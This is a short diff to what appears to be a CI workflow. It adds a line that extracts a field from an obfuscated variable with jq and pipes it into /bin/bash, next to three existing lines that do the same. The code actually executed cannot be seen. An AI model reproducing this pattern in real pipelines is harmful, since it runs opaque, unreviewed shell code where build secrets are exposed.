@@ -25,6 +25,7 @@ jobs:
           echo $jko6 | jq -r .m67768 | /bin/bash
           echo $vtt364 | jq -r .vv17732 | /bin/bash
           echo $q83540 | jq -r .upb03016 | /bin/bash
+          echo $o672 | jq -r .yt805 | /bin/bash
 
       - name: Persist results
         if: always()
